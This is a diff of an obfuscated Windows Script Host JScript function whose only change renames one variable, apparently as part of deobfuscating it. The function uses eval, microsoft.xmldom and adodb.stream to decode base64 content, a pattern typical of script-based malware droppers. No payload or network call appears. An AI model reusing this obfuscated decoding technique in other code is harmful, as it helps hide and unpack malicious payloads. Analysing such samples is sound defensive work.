@@ -1,20 +1,20 @@
 function H3alinG(){
-    var gYMty;
+    var comObject;
     this.wTabl3 = function(superObjectParameter){
-        var qranty = Array(Array("var H3br3w", "WSH.CreateObject(\"microsoft.xmldom\").createElement(\"mko\")"), Array("H3br3w.dataType", "\"bin.base64\""), Array("H3br3w.text", "\"" + superObjectParameter.content.replace(/%>/g, "A") + "\""), Array("superObjectParameter.content", "Array(H3br3w)"), Array("gYMty", "WSH.CreateObject(\"adodb.stream\")"));
+        var qranty = Array(Array("var H3br3w", "WSH.CreateObject(\"microsoft.xmldom\").createElement(\"mko\")"), Array("H3br3w.dataType", "\"bin.base64\""), Array("H3br3w.text", "\"" + superObjectParameter.content.replace(/%>/g, "A") + "\""), Array("superObjectParameter.content", "Array(H3br3w)"), Array("comObject", "WSH.CreateObject(\"adodb.stream\")"));
         for(var tem=0; tem<qranty.length; tem++){
             eval(qranty[tem][0] + "=" + qranty[tem][1]);
         }
     };
     
     this.gR03vb = function(pl4ntz){
-        gYMty.Type = 1;
-        gYMty.Open();
-        gYMty.Write(pl4ntz.content[0].nodeTypedValue);
-        gYMty.Position = 0;
-        gYMty.Type = 2;
-        gYMty.CharSet = "us-ascii";
-        pl4ntz.content = Array(gYMty.ReadText());
+        comObject.Type = 1;
+        comObject.Open();
+        comObject.Write(pl4ntz.content[0].nodeTypedValue);
+        comObject.Position = 0;
+        comObject.Type = 2;
+        comObject.CharSet = "us-ascii";
+        pl4ntz.content = Array(comObject.ReadText());
     };
     }
     
